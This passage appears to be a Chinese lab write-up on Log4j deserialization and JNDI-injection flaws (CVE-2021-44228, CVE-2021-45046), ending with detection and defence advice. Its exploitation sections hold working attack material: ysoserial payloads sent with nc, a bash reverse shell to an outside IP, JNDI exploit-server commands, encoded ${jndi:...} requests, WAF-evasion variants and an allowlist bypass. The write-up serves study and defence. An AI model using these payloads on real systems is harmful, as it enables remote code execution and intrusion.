            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后写一个main函数，在8888端口起一个接收数据的SocketServer</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStreamLogEventBridge</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>net<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">TcpSocketServer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jSocketServer</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">TcpSocketServer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">&gt;</span></span> myServer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">{</span>
            myServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TcpSocketServer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStreamLogEventBridge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        myServer<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>只需要将反序列化后的payload发送给这个端口，</p><figure><img src="`+i+'" alt="image-20230713154838259" tabindex="0" loading="lazy"><figcaption>image-20230713154838259</figcaption></figure><p>第一个断点处，等待接收socket数据；</p><p>第二个断点处，将接收到的数据转换成<strong>ObjectInputStream</strong> 对象数据；</p><p>最终在 <code>handler.start()</code> 中调用<strong>SocketHandler</strong> 类的 <strong>run</strong> 方法。</p><figure><img src="'+u+'" alt="image-20230713155351255" tabindex="0" loading="lazy"><figcaption>image-20230713155351255</figcaption></figure><p>在 <strong>SocketHandler</strong> 类的 <strong>run</strong> 方法中， <strong>ObjectInputStream</strong>对象数据被传入了 <strong>ObjectInputStreamLogEventBridge</strong> 类的 <strong>logEvents</strong>方法，而反序列化就发生在这个方法中。</p><figure><img src="'+r+`" alt="image-20230713155701764" tabindex="0" loading="lazy"><figcaption>image-20230713155701764</figcaption></figure><p>就是这样。</p><p>（3）漏洞利用</p><blockquote><p>本地环境漏洞利用：</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-all.jar CommonsCollections3 calc &gt;&gt; payload.bin
cat payload.bin | nc 127.0.0.1 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>vulhub靶场环境，使用工具ysoserial</p></blockquote><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/success&quot; | nc 192.168.1.189 4712

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+g+'" alt="image-20230712163753249" tabindex="0" loading="lazy"><figcaption>image-20230712163753249</figcaption></figure><figure><img src="'+d+`" alt="image-20230712163807743" tabindex="0" loading="lazy"><figcaption>image-20230712163807743</figcaption></figure><h3 id="_2-2-log4j2-jndi注入漏洞-cve-2021-44228" tabindex="-1"><a class="header-anchor" href="#_2-2-log4j2-jndi注入漏洞-cve-2021-44228" aria-hidden="true">#</a> 2.2 Log4j2 JNDI注入漏洞（CVE-2021-44228）</h3><p>（1）漏洞介绍</p><p>漏洞影响版本为2.0~2.14.1。</p><p>2021 年 11 月 24 日，阿里云安全团队向 Apache 官方报告了 Apache Log4j2 远程代码执行漏洞，在 12 月 9 日被国外有人公开 POC，从而导致了一波安全从业人员的疯狂运动，甲方安全从业者加班加点修复漏洞；白帽子们疯狂扫描漏洞并提交 SRC，一度导致一些 SRC 发布公告暂停接收相关漏洞；而黑灰产们已经在自己的挖矿勒索武器库上增加了该漏洞的利用模块。为什么会这么疯狂？</p><p>漏洞触发及其简单，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>漏洞刚爆出时受影响的组件：
Spring-Boot-strater-log4j2
Apache Struts2
Apache Solr
Apache Flink
Apache Druid
ElasticSearch
Flume
Dubbo
Redis
Logstash
Kafka
vmvare
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此漏洞影响广泛，开源组件中有近两万项目使用该存在漏洞的模块，绝对是目前为止影响最为广泛的漏洞，堪比之前出现的 heartbleed（心脏滴血）漏洞。比如 vmvare 的公告：https://www.vmware.com/security/advisories/VMSA-2021-0028.html</p>`,65),T={href:"https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247496216&idx=1&sn=2c85e1ad985e8a37c5ec2b7a5bded7cd&scene=21#wechat_redirect",target:"_blank",rel:"noopener noreferrer"},B=e('<p>大量网站存在这个问题，比如百度：</p><figure><img src="'+k+'" alt="640" tabindex="0" loading="lazy"><figcaption>640</figcaption></figure><p>ICloud：</p><figure><img src="'+m+'" alt="icloud" tabindex="0" loading="lazy"><figcaption>icloud</figcaption></figure><figure><img src="'+v+'" alt="jingdong" tabindex="0" loading="lazy"><figcaption>jingdong</figcaption></figure><p>（2）漏洞原理</p><p>关于log4j2的lookup功能</p><p>https://logging.apache.org/log4j/2.x/manual/lookups.html</p><p>日志在打印时当遇到 <code>${</code> 后，Interpolator 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><p>调用堆栈如下：</p><figure><img src="'+b+`" alt="image-20230714093554406" tabindex="0" loading="lazy"><figcaption>image-20230714093554406</figcaption></figure><p>关键点：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>LOGGER.error
  ......
    MessagePatternConverter.format
      ....
        StrSubstitutor.resolveVariable
          Interpolator.lookup
            JndiLookup.lookup
              JndiManager.lookup
                InitialContext.lookup

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><strong>MessagePatternConverter.format</strong></li></ul><p>poc代码中的LOGGER.error()方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含<code>\${</code>子串时，调用StrSubstitutor进行进一步解析。</p><figure><img src="`+h+'" alt="image-20230714093902104" tabindex="0" loading="lazy"><figcaption>image-20230714093902104</figcaption></figure><ul><li><strong>StrSubstitutor.resolveVariable</strong></li></ul><p>StrSubstitutor将<code>${</code>和<code>}</code>之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。</p><figure><img src="'+f+'" alt="image-20230714094046558" tabindex="0" loading="lazy"><figcaption>image-20230714094046558</figcaption></figure><ul><li><strong>Interpolator.lookup</strong></li></ul><p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法。</p><p>例如对poc例子中的jndi:ldap://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==解析后得到jndi的Lookup功能实现类为JndiLookup，并调用JndiLookup.lookup()方法。 <img src="'+j+'" alt="image-20230714094607300" loading="lazy"></p><ul><li><strong>JndiLookup.lookup</strong></li></ul><p><code>JndiLookup.lookup()</code>方法调用<code>JndiManager.lookup()</code>方法</p><figure><img src="'+x+'" alt="image-20230714095658156" tabindex="0" loading="lazy"><figcaption>image-20230714095658156</figcaption></figure><p>获取JNDI对象后，调用该对象上的<code>toString()</code>方法，最终返回该字符串。</p><figure><img src="'+y+'" alt="image-20230714094925609" tabindex="0" loading="lazy"><figcaption>image-20230714094925609</figcaption></figure><ul><li><strong>JndiManager.lookup</strong></li></ul><p><code>JndiManager.lookup()</code>较为简单，直接委托给<code>InitialContext.lookup()</code>方法。这里单独提到该方法，是因为后续几个补丁中较为重要的变更即为该方法。</p><figure><img src="'+_+`" alt="image-20230714095048611" tabindex="0" loading="lazy"><figcaption>image-20230714095048611</figcaption></figure><p>（3） 漏洞利用</p><blockquote><p><strong>环境1：vulfocus/log4j2-cve-2021-44228:latest</strong></p></blockquote><p>反弹shell命令如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/100.1.1.169/1245 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>将其base64编码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>先用JNDI注入工具起RMI或ldap，具体命令如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}&quot; -A 100.1.1.169
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[ADDRESS] &gt;&gt; 100.1.1.169
[COMMAND] &gt;&gt; bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+L+`" alt="image-20230711141952152" tabindex="0" loading="lazy"><figcaption>image-20230711141952152</figcaption></figure><p>选择一个payload复制，放入burpsuite的如下报文中（需要URL编码），发送给目标主机：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/hello?payload=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%30%30%2e%31%2e%31%2e%31%36%39%3a%31%30%39%39%2f%71%7a%74%73%39%63%7d%20</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.1.189:52721</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">6</span></span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>反弹shell成功</p><figure><img src="`+w+`" alt="image-20230711142555507" tabindex="0" loading="lazy"><figcaption>image-20230711142555507</figcaption></figure><hr><blockquote><p><strong>环境2：vulhub/solr:8.11.0 依赖了Log4j 2.14.1</strong></p></blockquote><p>起jndi服务的步骤和命令一样，就是把接口地址改成<code>/solr/admin/cores?action=</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code>GET /solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%30%30%2e%31%2e%31%2e%31%36%39%3a%31%30%39%39%2f%34%74%65%74%6f%33%7d  HTTP/1.1
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.1.189:8983</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><strong>环境3：本地运行的，源码地址https://github.com/christophetd/log4shell-vulnerable-app</strong></p><p><strong>同 vulfocus ghcr.io/christophetd/log4shell-vulnerable-app:latest</strong></p></blockquote><p>这里也是解析JNDI，只是解析的地方变成了从请求头里传进去的参数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar .\\JNDIExploit-1.4-SNAPSHOT.jar -i 10.89.17.243
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>起LDAP服务</p><figure><img src="`+q+'" alt="image-20230711174730147" tabindex="0" loading="lazy"><figcaption>image-20230711174730147</figcaption></figure><p>添加请求头<code>X-Api-Version</code>，内容为<code>${jndi:ldap://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==}</code>。</p><p>使用payload<code> Basic/Command/Base64/Y2FsYw==</code>，<code>Y2FsYw==</code>为<code>calc</code>的base64编码，如下：</p><figure><img src="'+S+'" alt="image-20230711174755203" tabindex="0" loading="lazy"><figcaption>image-20230711174755203</figcaption></figure><figure><img src="'+A+'" alt="image-20230711174909748" tabindex="0" loading="lazy"><figcaption>image-20230711174909748</figcaption></figure><p>成功弹出计算器</p><figure><img src="'+I+'" alt="image-20230711175225943" tabindex="0" loading="lazy"><figcaption>image-20230711175225943</figcaption></figure><p>请求头内容改成这样</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>说不定能绕过WAF</p><h3 id="_2-3-log4j2-jndi注入漏洞-cve-2021-45046" tabindex="-1"><a class="header-anchor" href="#_2-3-log4j2-jndi注入漏洞-cve-2021-45046" aria-hidden="true">#</a> 2.3 Log4j2 JNDI注入漏洞（CVE-2021-45046）</h3><p>（1）漏洞介绍</p><p>对于CVE-2021-44228漏洞在<code>2.15.0</code>版本上的修复不完善，漏洞影响版本：<code>All versions from 2.0-beta9 to 2.15.0, excluding 2.12.2</code></p><p>（2）漏洞原理</p><p>从<code>2.15.0</code>版本开始，默认是不开启Lookup功能，即<code>log42.formatMsgNoLookups</code>默认为<code>true</code>。已无法再通过设置该选项为<code>false</code>来开启Lookup功能，只能通过在配置文件中指定<code>%m{lookups}</code> 来开启。</p><p>并且，JndiManager#lookup()方法中，进行了以下安全校验：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(1) allowedProtocols：只允许协议java、ldap、ldaps；\n(2) allowedHosts：只允许主机为本机IP127.0.0.1、localhost等。\n(3) allowedClasses：LDAP服务器的返回包中javaClassName只允许为基本数据类型的类，比如java.lang.Boolean、java.lang.Byte、java.lang.Short等等。\n(4) 不能加载远程ObjectFactory类。\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="'+C+'" alt="image-20230714101905591" tabindex="0" loading="lazy"><figcaption>image-20230714101905591</figcaption></figure><figure><img src="'+D+`" alt="image-20230714102150354" tabindex="0" loading="lazy"><figcaption>image-20230714102150354</figcaption></figure><p><strong>绕过上述限制实现JNDI注入</strong></p><p>(1) 绕过协议白名单（java、ldap、ldaps）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>只能使用ldap协议进行JNDI注入。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>(2) 绕过主机白名单（本机IP127.0.0.1、localhost等）。使用Java的一个trick进行绕过，如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ldap://127.0.0.1#evilhost.com
当URI#getHost()方法遇到这样的url时，会取#前面，协议://后面的部分作为url的Host.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>(3) 绕过javaClassName白名单（如java.lang.Boolean、java.lang.Byte、java.lang.Short等）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>javaClassName这个属性的值是从LDAP服务器返回的数据里取的，而且这个属性的值对于后续的漏洞利用毫无影响，只要修改一下LDAP服务端的代码，将该值的属性改为满足log4j2中要求的值即可。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>(4) 绕过不能加载远程ObjectFactory类的限制</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>修改LDAP服务器，让其返回序列化数据，这样代码还是会走到最后的this.context.lookup()。在目标服务JNDI lookup的过程中，如果目标环境classpath中包含了可利用的反序列化Gadget，便可实现 RCE。
所以这里实现RCE的另一个条件就是目标环境中存在可被利用的Java反序列化Gadget。
至于LDAP服务的修改，参考《JNDI注入绕过高版本JDK限制》(https://blog.csdn.net/mole_exp/article/details/121141042)，只是添加一个返回序列化数据的功能。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>目前这几台主机都不支持ldap://127.0.0.1#evilhost.com这样的形式，暂未复现。</strong></p><h2 id="_3-检测与防御" tabindex="-1"><a class="header-anchor" href="#_3-检测与防御" aria-hidden="true">#</a> 3. 检测与防御</h2><h3 id="_3-1-检测漏洞是否存在" tabindex="-1"><a class="header-anchor" href="#_3-1-检测漏洞是否存在" aria-hidden="true">#</a> 3.1 检测漏洞是否存在</h3><p><strong>黑盒测试</strong></p><p>大家都知道存在漏洞是因为在打日志的时候存在问题，所以对于黑盒测试而言，只要是能够被服务端获取且被记录的地方都是可能触发漏洞的，比如 header 中的 Cookie、User-agent 等，post 或者 get 的参数中，url 中等，这种只能盲打，根据返回结果来判断。</p><p>检测漏洞项目参考：</p><blockquote><p>https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py</p></blockquote><figure><img src="`+N+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>主要在 header 和 参数中增加 payload 进行漏洞触发，可以结合 dnslog 平台实现自动化漏洞发现，攻击图如下：</p><figure><img src="'+E+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>白盒测试</strong></p><p>白盒相对容易一些，毕竟代码在手只需要搜索 git 平台的代码，如果符合漏洞版本范围内的都是存在问题的，全部升级替换即可。</p><p>下面是火线安全统计的关于存在漏洞组件的库，可以进行搜索</p><blockquote><p>https://log4j2.huoxian.cn/layout</p></blockquote><figure><img src="'+M+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><h3 id="_3-2-在野利用案例" tabindex="-1"><a class="header-anchor" href="#_3-2-在野利用案例" aria-hidden="true">#</a> 3.2 在野利用案例</h3>',95),U={href:"https://mp.weixin.qq.com/s?__biz=Mzg4OTU4MjQ4Mg==&mid=2247485419&idx=1&sn=a8fccee9a7b0a364f9b7831bd41f4961&scene=21#wechat_redirect",target:"_blank",rel:"noopener noreferrer"},R=n("figure",null,[n("img",{src:z,alt:"img",tabindex:"0",loading:"lazy"}),n("figcaption",null,"img")],-1),$={href:"https://mp.weixin.qq.com/s?__biz=Mzg2Nzg0NDkwMw==&mid=2247490088&idx=1&sn=9968a5ecf2211952c4245fc26e66a6f3&source=41#wechat_redirect",target:"_blank",rel:"noopener noreferrer"},W=e('<figure><img src="'+J+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>在野利用绝非检测到的这些方式，还有更多想不到的利用方式，这个也会长期存在。</p><h3 id="_3-3-漏洞防护方法" tabindex="-1"><a class="header-anchor" href="#_3-3-漏洞防护方法" aria-hidden="true">#</a> 3.3 漏洞防护方法</h3><p><strong>部署 WAF 等安全产品</strong></p><p>如果企业已经部署了 WAF 等安全产品，在漏洞爆发之初就应该及时更新规则，临时处置，从而给后续的根治争取时间，从 payload 上看，有几个关键特征:Extra open brace or missing close brace{，又可能造成正常功能无法使用，毕竟可能存在正常请求中包含这个关键词的情况。</p><p>下面是一个关于 waf 绕过思路，也可以作为防御的参考：</p><p>1、jndi、ldap、rmi 绕过</p><ul><li>用 lowerCase upperCase 把关键词分割开</li><li>如果使用了正则的话可以使用 upper 把 jndı 转成 jndi</li></ul><p>案例：</p><figure><img src="'+F+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>‍2、<code>${</code> 关键词拦截（范围大且容易产生误报，且不能真正解决，漏洞的触发点是在打印日志的时候把可控内容携带进去了）</p><p>3、为了减少误报，waf 匹配规则参考：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>\\$<span class="token punctuation">{</span><span class="token punctuation">(</span>\\$<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token operator">-</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;|&quot;|`)*( ?1)}*|[jndi:(ldap|rm)](&#39;</span><span class="token operator">|</span>&quot;<span class="token operator">|</span>`<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">}</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>效果如图：</p><figure><img src="'+O+'" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>代码层面修复</strong></p><p>升级log4j2：漏洞出现之后，官方也一直在推出补丁，然而一直也存在补丁绕过的情况 ，打官方补丁当然是一个比较靠谱的方式，但是一开始并不能完美解决。</p><p>升级Java版本：在进行漏洞利用时，针对高版本的 java jdk 是无法直接利用的，但是也不一定完全不可以，对于一些企业，定期更新 java 的可能影响比较小，所以 java 版本更新也是一种缓解的方式。</p><p>创建“log4j2.component.properties”文件，文件中增加配置“log4j2.formatMsgNoLookups=true”</p><p>设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></p><p><strong>运维层面防护</strong></p><p>1、采用 rasp 对lookup的调用进行阻断</p><p>2、限制不必要的业务访问外网</p><p>3、WAF 添加漏洞攻击代码临时拦截规则</p><blockquote><p>参考文献</p></blockquote><p><strong>介绍Log4j2的文章</strong></p>',26),H={href:"https://juejin.cn/post/7097962931690274829",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://www.cnblogs.com/jiyukai/p/9418463.html",target:"_blank",rel:"noopener noreferrer"},G={href:"https://blog.csdn.net/qq_36259143/article/details/124213506",target:"_blank",rel:"noopener noreferrer"},Q=n("p",null,[n("strong",null,"2.15.0之前版漏洞相关文章")],-1),K={href:"https://mochazz.github.io/2019/12/26/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90//#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1",target:"_blank",rel:"noopener 